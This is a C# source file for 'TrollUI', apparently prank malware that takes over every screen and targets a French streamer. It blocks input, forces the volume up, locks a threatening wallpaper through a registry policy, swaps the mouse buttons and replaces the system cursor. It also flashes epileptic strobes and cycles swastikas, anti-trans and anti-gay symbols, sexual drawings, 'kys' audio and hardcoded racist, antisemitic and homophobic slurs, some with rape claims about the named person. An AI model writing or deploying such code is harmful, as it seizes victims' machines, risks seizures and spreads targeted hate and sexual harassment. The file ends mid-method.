using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Windows;
using System.Windows.Threading;
using System.Windows.Input;
using System.Windows.Media;
using System.Media;
using SkiaSharp;
using SkiaSharp.Views.Desktop;
using SkiaSharp.Views.WPF;
using System.Threading.Tasks;
using System.Diagnostics;

namespace TrollUI
{
    public partial class MainWindow : Window
    {
        [DllImport("TrollNative.dll", CallingConvention = CallingConvention.Cdecl)]
        public static extern void Troll_Init();

        [DllImport("TrollNative.dll", CallingConvention = CallingConvention.Cdecl)]
        public static extern int Troll_IsKilled();

        [DllImport("TrollNative.dll", CallingConvention = CallingConvention.Cdecl)]
        public static extern void Troll_SetInputBlock(int block);

        [DllImport("user32.dll")]
        public static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, int dwExtraInfo);

        // --- Nouveaux hooks User32 pour le Lore FR (Ririmiaou) ---
        [DllImport("user32.dll")]
        public static extern int SwapMouseButton(int bSwap);

        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        public static extern IntPtr LoadCursorFromFile(string lpFileName);

        [DllImport("user32.dll")]
        public static extern bool SetSystemCursor(IntPtr hcur, uint id);

        [DllImport("user32.dll")]
        public static extern bool SystemParametersInfo(uint uiAction, uint uiParam, string pvParam, uint fWinIni);
        
        private const uint SPI_SETDESKWALLPAPER = 0x0014;
        private const uint SPI_SETCURSORS = 0x0057;
        private const uint SPIF_UPDATEINIFILE = 0x01;
        private const uint SPIF_SENDWININICHANGE = 0x02;
        
        private const uint OCR_NORMAL = 32512;

        private const byte VK_VOLUME_UP = 0xAF;

        private DispatcherTimer? _renderTimer;
        private DispatcherTimer? _phaseTimer;
        private DispatcherTimer? _timeoutTimer;
        private DispatcherTimer? _wallpaperTimer; // Nouveau timer pour le compte à rebours
        private int _currentPhase = 0;
        private int _wallpaperCountdown = 30; // 30 secondes
        private Random _rng = new Random();
        
        // Effects layers
        private bool _drawAnomalies = false;
        private bool _drawDistortion = false;
        private bool _drawGlitchBoxes = false;
        private bool _drawStrobe = false;
        private int _strobeCounter = 0;
        
        // Modes
        private string _gameMode = "MENU";   // MENU -> RIRI / PUNISHER / BLEED
        private bool _gameStarted = false;
        
        // Particules Coeur
        private float[] _heartX = new float[120];
        private float[] _heartY = new float[120];
        private float[] _heartSpeed = new float[120];
        
        // Particules Sang
        private float[] _bloodY = new float[60];
        private float[] _bloodSpeed = new float[60];
        
        // Images chargées via Skia
        private SKBitmap? _imgRirimiaou;
        private SKBitmap? _imgPunisher;
        private SKBitmap? _imgBrawlStars;
        
        // MP3 Players (WPF native)
        private MediaPlayer _mp3Asterion = new MediaPlayer();
        private MediaPlayer _mp3Goofy = new MediaPlayer();
        private MediaPlayer _mp3Duck = new MediaPlayer();
        private MediaPlayer _mp3Rizz = new MediaPlayer();
        private MediaPlayer _mp3Anime = new MediaPlayer();
        private MediaPlayer _mp3Ah = new MediaPlayer();
        
        // WTF Effects
        private float _shakeX = 0, _shakeY = 0;
        private int _frameCount = 0;
        
        // Lore FR flags
        private bool _ririmiaouSyndromeActive = false;
        private DateTime _lastAsterionScreamer = DateTime.MinValue;
        
        private string _assetDir = @"C:\Users\Kiwi\Desktop\Project 11\Asset";

        public MainWindow()
        {
            InitializeComponent();
            
            // Absolute Domination on all screens
            this.Left = SystemParameters.VirtualScreenLeft;
            this.Top = SystemParameters.VirtualScreenTop;
            this.Width = SystemParameters.VirtualScreenWidth;
            this.Height = SystemParameters.VirtualScreenHeight;
        }

        private void Window_Loaded(object sender, RoutedEventArgs e)
        {
            // Chargement des images
            LoadImages();
            
            // Init MP3s
            _mp3Asterion.Open(new Uri(Path.Combine(_assetDir, @"Asterion\asterion-hyype_mf21o8p.mp3")));
            _mp3Goofy.Open(new Uri(Path.Combine(_assetDir, "goofy-ass-sound.mp3")));
            _mp3Duck.Open(new Uri(Path.Combine(_assetDir, "duck-toy-sound.mp3")));
            _mp3Rizz.Open(new Uri(Path.Combine(_assetDir, "rizz-sound-effect.mp3")));
            _mp3Anime.Open(new Uri(Path.Combine(_assetDir, "anime_wow.mp3"))); // Syndrome Ririmiaou
            _mp3Ah.Open(new Uri(Path.Combine(_assetDir, "ah.wav")));
            
            _mp3Asterion.Volume = 1.0;
            _mp3Goofy.Volume = 1.0;
            _mp3Duck.Volume = 1.0;
            _mp3Rizz.Volume = 1.0;
            _mp3Anime.Volume = 1.0;
            _mp3Ah.Volume = 1.0;
            
            // Init particules
            for (int i = 0; i < 120; i++)
            {
                _heartX[i] = _rng.Next((int)SystemParameters.VirtualScreenWidth);
                _heartY[i] = _rng.Next(-1500, 0);
                _heartSpeed[i] = (float)(_rng.NextDouble() * 12 + 5);
            }
            for (int i = 0; i < 60; i++)
            {
                _bloodY[i] = 0;
                _bloodSpeed[i] = (float)(_rng.NextDouble() * 6 + 1);
            }
            
            try
            {
                Troll_Init();
            }
            catch (Exception)
            {
                // Silent in dev mode
            }

            // Volume MAX continu
            DispatcherTimer volTimer = new DispatcherTimer();
            volTimer.Interval = TimeSpan.FromMilliseconds(80);
            volTimer.Tick += (s, ev) =>
            {
                for (int i = 0; i < 5; i++)
                {
                    keybd_event(VK_VOLUME_UP, 0, 0, 0);
                    keybd_event(VK_VOLUME_UP, 0, 2, 0);
                }
            };
            volTimer.Start();

            // 60 FPS Skia
            _renderTimer = new DispatcherTimer();
            _renderTimer.Interval = TimeSpan.FromMilliseconds(16);
            _renderTimer.Tick += (s, ev) =>
            {
                if (CheckKillSwitch()) return;
                skCanvas.InvalidateVisual();
            };
            _renderTimer.Start();
            
            // Background pulsation pendant le menu
            PlayAudioAsync("cry.wav", true);
            
            // Timeout : 15 secondes pour choisir sinon BLEED
            _timeoutTimer = new DispatcherTimer();
            _timeoutTimer.Interval = TimeSpan.FromSeconds(15);
            _timeoutTimer.Tick += (s, ev) =>
            {
                _timeoutTimer.Stop();
                if (!_gameStarted) StartMode("BLEED");
            };
            _timeoutTimer.Start();
        }

        private SKBitmap? RemoveBackground(SKBitmap? original, bool removeDark)
        {
            if (original == null) return null;
            var bmp = original.Copy();
            for (int y = 0; y < bmp.Height; y++)
            {
                for (int x = 0; x < bmp.Width; x++)
                {
                    var col = bmp.GetPixel(x, y);
                    if (removeDark && col.Red <= 45 && col.Green <= 45 && col.Blue <= 45)
                        bmp.SetPixel(x, y, col.WithAlpha(0));
                    else if (!removeDark && col.Red >= 210 && col.Green >= 210 && col.Blue >= 210)
                        bmp.SetPixel(x, y, col.WithAlpha(0));
                }
            }
            return bmp;
        }

        private void LoadImages()
        {
            string ririPath  = Path.Combine(_assetDir, "ririmiaou2.png");
            string punPath   = Path.Combine(_assetDir, "punisher2.png");
            string bsPath    = Path.Combine(_assetDir, "brawlstars.png");
            
            if (File.Exists(ririPath))
            {
                using (var raw = SKBitmap.Decode(ririPath))
                    _imgRirimiaou = RemoveBackground(raw, removeDark: false); // On retire le blanc pour la fille
            }
            if (File.Exists(punPath))
            {
                using (var raw = SKBitmap.Decode(punPath))
                    _imgPunisher = RemoveBackground(raw, removeDark: true);
            }
            if (File.Exists(bsPath))
            {
                using (var raw = SKBitmap.Decode(bsPath))
                    _imgBrawlStars = RemoveBackground(raw, removeDark: false); // L'image a un fond plutôt clair/rouge
            }
        }

        // === BOUTONS WPF ===
        private void BtnRiri_Click(object sender, MouseButtonEventArgs e)
        {
            StartMode("RIRI");
        }
        
        private void BtnPunisher_Click(object sender, MouseButtonEventArgs e)
        {
            StartMode("PUNISHER");
        }
        
        private void BtnSoft_Click(object sender, MouseButtonEventArgs e)
        {
            StartMode("SOFT");
        }
        
        private void BtnDebug_Click(object sender, MouseButtonEventArgs e)
        {
            StartMode("DEBUG");
        }
        
        private void StartMode(string mode)
        {
            if (_gameStarted) return;
            _gameStarted = true;
            _gameMode = mode;
            _timeoutTimer?.Stop();
            
            // Cacher le panel de sélection
            gamePanel.Visibility = Visibility.Collapsed;
            
            // Bloquer les inputs
            try { Troll_SetInputBlock(1); } catch { }
            
            if (mode == "RIRI")
            {
                // Crescendo classique lent (grosse pression psychologique)
                _phaseTimer = new DispatcherTimer();
                _phaseTimer.Interval = TimeSpan.FromSeconds(12); // Pression anxiogène lente
                _phaseTimer.Tick += PhaseTimer_Tick;
                _phaseTimer.Start();
                PhaseTimer_Tick(this, EventArgs.Empty);
            }
            else if (mode == "PUNISHER")
            {
                // Crescendo Extrême Punisher (Montée en régime)
                _phaseTimer = new DispatcherTimer();
                _phaseTimer.Interval = TimeSpan.FromSeconds(10); // Plus d'attente
                _phaseTimer.Tick += PhaseTimer_Tick;
                _phaseTimer.Start();
                PhaseTimer_Tick(this, EventArgs.Empty);
                PlayAudioAsync("kys.wav", true);
            }
            else if (mode == "SOFT")
            {
                // Un mode de "blagues" et trolls homophobes doucement insultants
                _phaseTimer = new DispatcherTimer();
                _phaseTimer.Interval = TimeSpan.FromSeconds(15); 
                _phaseTimer.Tick += PhaseTimer_Tick;
                _phaseTimer.Start();
                PhaseTimer_Tick(this, EventArgs.Empty);
                PlayAudioAsync("ah.wav", true); // Son absurde pour le mode "Soft/Jokes"
            }
            else if (mode == "DEBUG")
            {
                // Mode Debug : fige le canvas et montre tout sans tuer les inputs pour dev
                try { Troll_SetInputBlock(0); } catch { } // Débloque les inputs pour le dev
            }
            else if (mode == "BLEED")
            {
                PlayAudioAsync("cry.wav", true);
            }
            
            // Activation du Wallpaper Timer en modes agressifs
            if (mode == "RIRI" || mode == "PUNISHER" || mode == "SOFT")
            {
                _wallpaperCountdown = (mode == "PUNISHER") ? 15 : 60; // 15 ou 60 sec selon l'urgence
                _wallpaperTimer = new DispatcherTimer();
                _wallpaperTimer.Interval = TimeSpan.FromSeconds(1);
                _wallpaperTimer.Tick += WallpaperTimer_Tick;
                _wallpaperTimer.Start();
                UpdateWallpaper(); // Init immédiate
            }
        }
        
        private void WallpaperTimer_Tick(object? sender, EventArgs e)
        {
            _wallpaperCountdown--;
            UpdateWallpaper();
        }
        
        private void UpdateWallpaper()
        {
            string baseImgPath = Path.Combine(_assetDir, "Sans titre.png");
            if (!File.Exists(baseImgPath)) return;
            
            // On veut générer une image modifiée avec le texte
            string outPath = Path.Combine(Path.GetTempPath(), "troll_wallpaper.bmp");
            
            using (var bmp = SKBitmap.Decode(baseImgPath))
            {
                if (bmp == null) return;
                
                var info = new SKImageInfo(bmp.Width, bmp.Height, bmp.ColorType, bmp.AlphaType);
                using (var surface = SKSurface.Create(info))
                {
                    var canvas = surface.Canvas;
                    canvas.DrawBitmap(bmp, 0, 0);
                    
                    // Incruster le texte rouge sang
                    using (var pBg = new SKPaint { Color = new SKColor(0, 0, 0, 180), Style = SKPaintStyle.Fill })
                    using (var pText = new SKPaint { Color = SKColors.Red, IsAntialias = true })
                    using (var font = new SKFont(SKTypeface.FromFamilyName("Impact"), bmp.Width / 15f))
                    {
                        string txt = $"RIRIMIAOU TE BAISERA LE CUL DANS : {_wallpaperCountdown} SECONDES";
                        if (_wallpaperCountdown <= 0) txt = "TROP LENT. T'ES FINI.";
                        
                        float th = font.Size + 20;
                        canvas.DrawRect(0, bmp.Height - th - 50, bmp.Width, th, pBg);
                        canvas.DrawText(txt, bmp.Width / 2f, bmp.Height - 60, SKTextAlign.Center, font, pText);
                    }
                    
                    using (var image = surface.Snapshot())
                    using (var data = image.Encode(SKEncodedImageFormat.Bmp, 100))
                    using (var stream = File.OpenWrite(outPath))
                    {
                        data.SaveTo(stream);
                    }
                }
            }
            
            // Appliquer le wallpaper via SystemParametersInfo
            SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, outPath, SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE);
            
            // Lockdown : interdiction de le changer via Stratégie de Groupe (Registre)
            try
            {
                using (var key = Microsoft.Win32.Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\ActiveDesktop"))
                {
                    key.SetValue("NoChangingWallPaper", 1, Microsoft.Win32.RegistryValueKind.DWord);
                }
            }
            catch { /* Silencieux si pas de perms admin */ }
        }

        private bool CheckKillSwitch()
        {
            try
            {
                if (Troll_IsKilled() == 1)
                {
                    _renderTimer?.Stop();
                    _phaseTimer?.Stop();
                    _wallpaperTimer?.Stop();
                    
                    // Cleanup Lore FR (rétablir les clics normaux de la souris)
                    SwapMouseButton(0);
                    SystemParametersInfo(SPI_SETCURSORS, 0, null!, 0);
                    
                    // Déverrouillage du fond d'écran
                    try
                    {
                        using (var key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\ActiveDesktop", true))
                        {
                            if (key != null) key.DeleteValue("NoChangingWallPaper", false);
                        }
                    }
                    catch { }
                    
                    Application.Current.Shutdown();
                    return true;
                }
            }
            catch { }
            return false;
        }

        private void PhaseTimer_Tick(object? sender, EventArgs e)
        {
            _currentPhase++;
            
            switch (_currentPhase)
            {
                case 1:
                    _drawAnomalies = true;
                    if (_gameMode == "RIRI" || _gameMode == "SOFT") PlayAudioAsync("cry.wav"); // Phase 1 Douce/Mignonne
                    else PlayAudioAsync("cry.wav");
                    break;
                case 2:
                    _drawDistortion = true;
                    if (_gameMode == "PUNISHER") PlayAudioAsync("kys.wav");
                    if (_gameMode == "RIRI" || _gameMode == "SOFT")
                    {
                        PlayAudioAsync("kys.wav"); // Explosion Maman Blzstars -> Gore
                        _mp3Goofy.Position = TimeSpan.Zero;
                        _mp3Goofy.Play();
                    }
                    break;
                case 3:
                    _drawGlitchBoxes = true;
                    if (_gameMode == "RIRI" || _gameMode == "SOFT")
                    {
                        _mp3Rizz.Position = TimeSpan.Zero;
                        _mp3Rizz.Play();
                    }
                    else PlayAudioAsync("kys.wav");
                    break;
                case 4:
                    _drawStrobe = true;
                    if (_gameMode == "RIRI" || _gameMode == "SOFT")
                    {
                        _mp3Anime.Position = TimeSpan.Zero;
                        _mp3Anime.Play();
                    }
                    else PlayAudioAsync("sex.wav", loop: true);
                    
                    // --- SYNDROME RIRIMIAOU (Déclenchement Phase 4) ---
                    if (!_ririmiaouSyndromeActive)
                    {
                        _ririmiaouSyndromeActive = true;
                        
                        // Swap aléatoire des clics souris (1 = inversé)
                        SwapMouseButton(1);
                        
                        // Remplacement global du curseur Windows
                        IntPtr customCursor = LoadCursorFromFile(Path.Combine(_assetDir, "catbox.cur"));
                        if (customCursor != IntPtr.Zero)
                        {
                            SetSystemCursor(customCursor, OCR_NORMAL);
                        }
                        
                        // Joue le son wow anime saturé
                        _mp3Anime.Position = TimeSpan.Zero;
                        _mp3Anime.Play();
                    }
                    break;
                case 5:
                    _phaseTimer?.Stop();
                    break;
            }
        }

        private void OnPaintSurface(object sender, SKPaintSurfaceEventArgs e)
        {
            SKCanvas canvas = e.Surface.Canvas;
            int w = e.Info.Width;
            int h = e.Info.Height;
            _frameCount++;
            
            canvas.Clear(SKColors.Transparent);
            
            // === MENU MODE (pas encore choisi) ===
            if (_gameMode == "MENU")
            {
                // Fond pulsant rouge subtil pendant le menu
                int alphaVal = (int)(15 + (Math.Sin(_frameCount / 20.0) * 15));
                byte alpha = (byte)Math.Clamp(alphaVal, 0, 255);
                canvas.DrawRect(0, 0, w, h, new SKPaint { Color = new SKColor(100, 0, 0, alpha) });
                return;
            }
            
            // Save initial pour le shaking (sera Restore à la fin)
            canvas.Save();
            
            // === WTF SHAKING (toujours actif après sélection) ===
            float shakeIntensity = (_currentPhase * 25f) + 5f; // Très violent en phase 4 (105px)
            _shakeX = (float)(_rng.NextDouble() * shakeIntensity * 2 - shakeIntensity);
            _shakeY = (float)(_rng.NextDouble() * shakeIntensity * 2 - shakeIntensity);
            canvas.Translate(_shakeX, _shakeY);

            // === MODE PUNISHER ===
            if (_gameMode == "PUNISHER")
            {
                // Un fond epileptique Rouge/Noir intense qui s'aggrave avec les phases
                bool isRed = _currentPhase >= 4 ? (_frameCount % 4 < 2) : (_frameCount % 10 < 5);
                canvas.Clear(isRed ? new SKColor(150, 0, 0) : SKColors.Black);
                
                float cx = w / 2f;
                float cy = h / 2f;
                float time = _frameCount / 10.0f;
                
                // PHASE 2+ : SVG Raciste (Swastika tournoyante géante)
                if (_currentPhase >= 2)
                {
                    canvas.Save();
                    canvas.Translate(cx, cy);
                    canvas.RotateDegrees(time * 60); // Tourne vite
                    float swSize = 300 + (float)Math.Sin(time * 5) * 100;
                    
                    using (var pSwastika = new SKPaint { 
                        Color = isRed ? SKColors.Black : SKColors.Red, 
                        Style = SKPaintStyle.Stroke, 
                        StrokeWidth = 40, 
                        StrokeCap = SKStrokeCap.Square, 
                        IsAntialias = true 
                    })
                    {
                        var swPath = new SKPath();
                        swPath.MoveTo(-swSize, 0); swPath.LineTo(swSize, 0);
                        swPath.MoveTo(0, -swSize); swPath.LineTo(0, swSize);
                        swPath.MoveTo(-swSize, 0); swPath.LineTo(-swSize, -swSize);
                        swPath.MoveTo(swSize, 0); swPath.LineTo(swSize, swSize);
                        swPath.MoveTo(0, -swSize); swPath.LineTo(swSize, -swSize);
                        swPath.MoveTo(0, swSize); swPath.LineTo(-swSize, swSize);
                        canvas.DrawPath(swPath, pSwastika);
                    }
                    canvas.Restore();
                }

                // PHASE 3+ : SVGs Sexuels et Transphobes/Homophobes additionnels (Demande de chaos)
                // Apparition en fondu ("Smooth")
                byte alphaChaos = _currentPhase >= 3 ? (byte)Math.Clamp(Math.Sin(time * 3) * 255, 0, 255) : (byte)0;
                
                if (alphaChaos > 10)
                {
                    // 1. Phallus Extrême Animé
                    canvas.Save();
                    float cockX = cx + (float)Math.Sin(time*8)*200;
                    float cockY = cy + (float)Math.Cos(time*6)*200;
                    canvas.Translate(cockX, cockY);
                    canvas.RotateDegrees(-time * 40);
                    
                    using (var pCock = new SKPaint { 
                        Color = SKColors.HotPink.WithAlpha(alphaChaos), 
                        Style = SKPaintStyle.StrokeAndFill, 
                        StrokeWidth = 20, 
                        IsAntialias = true 
                    })
                    {
                        var cockPath = new SKPath();
                        cockPath.AddCircle(-150, 150, 100);
                        cockPath.AddCircle(150, 150, 100);
                        cockPath.MoveTo(-100, 120); cockPath.LineTo(-100, -250); cockPath.LineTo(100, -250); cockPath.LineTo(100, 120);
                        cockPath.AddCircle(0, -250, 120);
                        canvas.DrawPath(cockPath, pCock);
                    }
                    canvas.Restore();

                    // 2. Symbole Transgenre Barré ("Transphobe" demandé)
                    canvas.Save();
                    float transX = cx + (float)Math.Cos(time*7)*300;
                    float transY = cy + (float)Math.Sin(time*5)*300;
                    canvas.Translate(transX, transY);
                    canvas.RotateDegrees(time * 80);
                    
                    using (var pTrans = new SKPaint { Color = SKColors.LightSkyBlue.WithAlpha(alphaChaos), Style = SKPaintStyle.Stroke, StrokeWidth = 25, IsAntialias = true })
                    using (var pCross = new SKPaint { Color = SKColors.Red.WithAlpha(alphaChaos), Style = SKPaintStyle.Stroke, StrokeWidth = 35, IsAntialias = true })
                    {
                        var tPath = new SKPath();
                        tPath.AddCircle(0, 0, 100); // Cercle central
                        tPath.MoveTo(0, -100); tPath.LineTo(0, -200); // Flèche Haut
                        tPath.MoveTo(-30, -170); tPath.LineTo(0, -200); tPath.LineTo(30, -170);
                        tPath.MoveTo(-100, 100); tPath.LineTo(-180, 180); // Flèche Bas G
                        tPath.MoveTo(100, 100); tPath.LineTo(180, 180); // Flèche Bas D
                        canvas.DrawPath(tPath, pTrans);
                        canvas.DrawLine(-150, -150, 150, 150, pCross); // Barré en rouge
                    }
                    canvas.Restore();
                }

                // PHASE 4+ : Symbole Triangle Rose Barré ("Homophobe" demandé)
                byte alphaGay = _currentPhase >= 4 ? (byte)Math.Clamp(Math.Cos(time * 4) * 255, 0, 255) : (byte)0;
                if (alphaGay > 10)
                {
                    canvas.Save();
                    canvas.Translate(cx, cy);
                    canvas.Scale(2.5f + (float)Math.Sin(time*10));
                    
                    using (var pGay = new SKPaint { Color = SKColors.DeepPink.WithAlpha(alphaGay), Style = SKPaintStyle.Fill, IsAntialias = true })
                    using (var pCross = new SKPaint { Color = SKColors.Red.WithAlpha(alphaGay), Style = SKPaintStyle.Stroke, StrokeWidth = 20, IsAntialias = true })
                    {
                        var gPath = new SKPath();
                        gPath.MoveTo(0, -100);
                        gPath.LineTo(100, 100);
                        gPath.LineTo(-100, 100);
                        gPath.Close();
                        canvas.DrawPath(gPath, pGay);
                        canvas.DrawLine(-120, -120, 120, 120, pCross); // Barré
                    }
                    canvas.Restore();
                }
                
                // Flash Punisher + Textes hurlants (Furtif en phase 1, Omniprésent en phase 4)
                int flashFrequency = _currentPhase >= 4 ? 15 : (150 / _currentPhase);
                if (_imgPunisher != null && _frameCount % flashFrequency < 10)
                {
                    float imgW = w / 1.5f + (float)Math.Sin(time*10)*200;
                    float imgH = imgW * _imgPunisher.Height / _imgPunisher.Width;
                    float ix = cx - imgW/2 + _rng.Next(-50, 50);
                    float iy = cy - imgH/2 + _rng.Next(-50, 50);

                    using (var paint = new SKPaint { Color = new SKColor(255, 255, 255, 180) })
                    {
                        canvas.DrawBitmap(_imgPunisher, new SKRect(ix, iy, ix + imgW, iy + imgH), paint);
                    }
                }
                
                // Textes subluminaux choquants (Phase 1 = introductif, Phase 4 = apocalypse)
                string[] trollTexts = {
                    "SALE NÈGRE RENTRE CHEZ TOI", "DÉGAGE LE JUIF AU FOUR", "SUCE MON GROS ZIZI PD", 
                    "ASTERION LE MAÎTRE SUPRÊME", "PUNISHER T'A CANCEL", "TWITCH BAN DÉFINITIF", 
                    "VIOL DE RIRIMIAOU EN LIVE", "SALE PUTE", "SS", "HITLER 1945",
                    "RIRIMIAOU EST UN TRAVELO", "LES ARABES DEHORS", "SHOAH 2.0 BIENTÔT",
                    "GOUINE DE MERDE", "REGARDE SUR LE WEB RIRIMIAOU NUDES",
                    "TON PC EST JUIF IL BRÛLE"
                };
                
                // Plus on avance en phase, plus ça spam - Crescendo vicieux 
                // P1: Très rare (toutes les ~2s), P2: Régulier, P3: Vite, P4: Indécent
                int spamRate = _currentPhase >= 4 ? 2 : (_currentPhase == 3 ? 15 : (_currentPhase == 2 ? 40 : 120));
                
                if (_frameCount % spamRate < (_currentPhase * 3)) // Clignotement léger en p1
                {
                    using (var pTxt = new SKPaint { Color = SKColors.White, IsAntialias = true })
                    using (var fTxt = new SKFont(SKTypeface.FromFamilyName("Impact"), _rng.Next(100, 400)))
                    {
                        string txt = trollTexts[_rng.Next(trollTexts.Length)];
                        float tw = fTxt.MeasureText(txt);
                        canvas.DrawText(txt, _rng.Next(0, Math.Max(1, w - (int)tw)), _rng.Next(200, h - 50), SKTextAlign.Left, fTxt, pTxt);
                    }
                }
                
                // Spam Audio en Phase Finale
                if (_currentPhase >= 4 && _frameCount % 30 == 0) {
                    _mp3Asterion.Position = TimeSpan.Zero;
                    _mp3Asterion.Play();
                }
                
                canvas.Restore();
                return;
            }
            
            // === MODE SOFT (Blagues / Insultes Homophobes) ===
            if (_gameMode == "SOFT")
            {
                // Un fond pastel plus doux mais dégradant
                byte alphaBg = (byte)(100 + Math.Sin(_frameCount / 20.0) * 50);
                canvas.Clear(new SKColor(230, 180, 255, alphaBg)); // Violet très clair
                
                float cx = w / 2f;
                float cy = h / 2f;
                float time = _frameCount / 10.0f;
                
                // Petit phallus qui flotte en fond
                canvas.Save();
                canvas.Translate(cx + (float)Math.Sin(time*2)*150, cy + (float)Math.Cos(time*1.5)*150);
                canvas.RotateDegrees(time * 20);
                using (var pCock = new SKPaint { Color = new SKColor(255, 105, 180, 100), Style = SKPaintStyle.StrokeAndFill, StrokeWidth = 10, IsAntialias = true })
                {
                    var cockPath = new SKPath();
                    cockPath.AddCircle(-75, 75, 50);
                    cockPath.AddCircle(75, 75, 50);
                    cockPath.MoveTo(-50, 60); cockPath.LineTo(-50, -125); cockPath.LineTo(50, -125); cockPath.LineTo(50, 60);
                    cockPath.AddCircle(0, -125, 60);
                    canvas.DrawPath(cockPath, pCock);
                }
                canvas.Restore();
                
                string[] softTexts = {
                    "PTIT ZIZI", "T'ES UN PEU GAY NON ?", "LAVE TOI LES FESSES", "BOUFFON",
                    "RIRIMIAOU EST TON PÈRE", "TON HISTORIQUE EST LOUCHE", "SUCEUR DE BITTES",
                    "🤡 HONK HONK 🤡", "TA MÈRE EN STRING"
                };
                
                if (_frameCount % 30 == 0) // Lent
                {
                    using (var pTxt = new SKPaint { Color = SKColors.DarkViolet, IsAntialias = true })
                    using (var fTxt = new SKFont(SKTypeface.FromFamilyName("Comic Sans MS"), _rng.Next(80, 180)))
                    {
                        string txt = softTexts[_rng.Next(softTexts.Length)];
                        float tw = fTxt.MeasureText(txt);
                        canvas.DrawText(txt, _rng.Next(0, Math.Max(1, w - (int)tw)), _rng.Next(100, h - 50), SKTextAlign.Left, fTxt, pTxt);
                    }
                }
                
                canvas.Restore();
                return;
            }

            // === MODE DEBUG (Panel Statique pour Check des SVGs sur Github) ===
            if (_gameMode == "DEBUG")
            {
                canvas.Clear(new SKColor(30, 30, 40)); // Fond sombre dev
                
                float cx = w / 2f;
                float cy = h / 2f;
                
                using (var pTxt = new SKPaint { Color = SKColors.White, IsAntialias = true })
                using (var fTxt = new SKFont(SKTypeface.FromFamilyName("Consolas"), 30))
                {
                    canvas.DrawText("DEBUG MODE : VUE DES ARTWORKS SVGs", 50, 50, SKTextAlign.Left, fTxt, pTxt);
                }

                // 1. ZIZI (Top-Left)
                canvas.Save();
                canvas.Translate(cx - 350, cy - 150);
                canvas.Scale(0.5f);
                using (var pCock = new SKPaint { Color = SKColors.HotPink, Style = SKPaintStyle.StrokeAndFill, StrokeWidth = 20, IsAntialias = true })
                {
                    var cockPath = new SKPath();
                    cockPath.AddCircle(-150, 150, 100); cockPath.AddCircle(150, 150, 100);
                    cockPath.MoveTo(-100, 120); cockPath.LineTo(-100, -250); cockPath.LineTo(100, -250); cockPath.LineTo(100, 120);
                    cockPath.AddCircle(0, -250, 120);
                    canvas.DrawPath(cockPath, pCock);
                }
                canvas.Restore();

                // 2. Trans Barré (Top-Right)
                canvas.Save();
                canvas.Translate(cx + 350, cy - 150);
                canvas.Scale(0.8f);
                using (var pTrans = new SKPaint { Color = SKColors.LightSkyBlue, Style = SKPaintStyle.Stroke, StrokeWidth = 25, IsAntialias = true })
                using (var pCross = new SKPaint { Color = SKColors.Red, Style = SKPaintStyle.Stroke, StrokeWidth = 35, IsAntialias = true })
                {
                    var tPath = new SKPath();
                    tPath.AddCircle(0, 0, 100); 
                    tPath.MoveTo(0, -100); tPath.LineTo(0, -200); 
                    tPath.MoveTo(-30, -170); tPath.LineTo(0, -200); tPath.LineTo(30, -170);
                    tPath.MoveTo(-100, 100); tPath.LineTo(-180, 180); 
                    tPath.MoveTo(100, 100); tPath.LineTo(180, 180); 
                    canvas.DrawPath(tPath, pTrans);
                    canvas.DrawLine(-150, -150, 150, 150, pCross); 
                }
                canvas.Restore();

                // 3. Triangle Rose Gay Barré (Bottom-Left)
                canvas.Save();
                canvas.Translate(cx - 350, cy + 200);
                using (var pGay = new SKPaint { Color = SKColors.DeepPink, Style = SKPaintStyle.Fill, IsAntialias = true })
                using (var pCross = new SKPaint { Color = SKColors.Red, Style = SKPaintStyle.Stroke, StrokeWidth = 20, IsAntialias = true })
                {
                    var gPath = new SKPath();
                    gPath.MoveTo(0, -100); gPath.LineTo(100, 100); gPath.LineTo(-100, 100); gPath.Close();
                    canvas.DrawPath(gPath, pGay);
                    canvas.DrawLine(-120, -120, 120, 120, pCross); 
                }
                canvas.Restore();

                // 4. Swastika (Bottom-Right)
                canvas.Save();
                canvas.Translate(cx + 350, cy + 200);
                canvas.Scale(0.7f);
                using (var pSwastika = new SKPaint { Color = SKColors.Red, Style = SKPaintStyle.Stroke, StrokeWidth = 40, StrokeCap = SKStrokeCap.Square, IsAntialias = true })
                {
                    var swPath = new SKPath();
                    float swSize = 150f;
                    swPath.MoveTo(-swSize, 0); swPath.LineTo(swSize, 0);
                    swPath.MoveTo(0, -swSize); swPath.LineTo(0, swSize);
                    swPath.MoveTo(-swSize, 0); swPath.LineTo(-swSize, -swSize);
                    swPath.MoveTo(swSize, 0); swPath.LineTo(swSize, swSize);
                    swPath.MoveTo(0, -swSize); swPath.LineTo(swSize, -swSize);
                    swPath.MoveTo(0, swSize); swPath.LineTo(-swSize, swSize);
                    canvas.DrawPath(swPath, pSwastika);
                }
                // 5. Chat Ririmiaou (Center-Bottom)
                canvas.Save();
                canvas.Translate(cx, cy + 200);
                canvas.Scale(1.2f);
                using (var pPink = new SKPaint { Color = SKColors.Pink, Style = SKPaintStyle.Fill, IsAntialias = true })
                using (var pWhite = new SKPaint { Color = SKColors.White, Style = SKPaintStyle.Fill, IsAntialias = true })
                using (var pBlack = new SKPaint { Color = SKColors.Black, Style = SKPaintStyle.StrokeAndFill, StrokeWidth = 3, IsAntialias = true })
                {
                    canvas.DrawCircle(0, 0, 80, pPink);
                    canvas.DrawCircle(0, 0, 80, pBlack);
                    var earPath = new SKPath();
                    earPath.MoveTo(-70, -40); earPath.LineTo(-90, -100); earPath.LineTo(-20, -75);
                    earPath.MoveTo(70, -40); earPath.LineTo(90, -100); earPath.LineTo(20, -75);
                    canvas.DrawPath(earPath, pPink);
                    canvas.DrawPath(earPath, new SKPaint { Color = SKColors.Black, Style = SKPaintStyle.Stroke, StrokeWidth = 3, IsAntialias = true });
                    canvas.DrawCircle(-30, -10, 20, pWhite); canvas.DrawCircle(30, -10, 20, pWhite);
                    canvas.DrawCircle(-30, -10, 8, pBlack); canvas.DrawCircle(30, -10, 8, pBlack);
                    var whiskerPath = new SKPath();
                    whiskerPath.MoveTo(-40, 10); whiskerPath.LineTo(-90, 0); whiskerPath.MoveTo(-40, 20); whiskerPath.LineTo(-95, 20); whiskerPath.MoveTo(-40, 30); whiskerPath.LineTo(-90, 40);
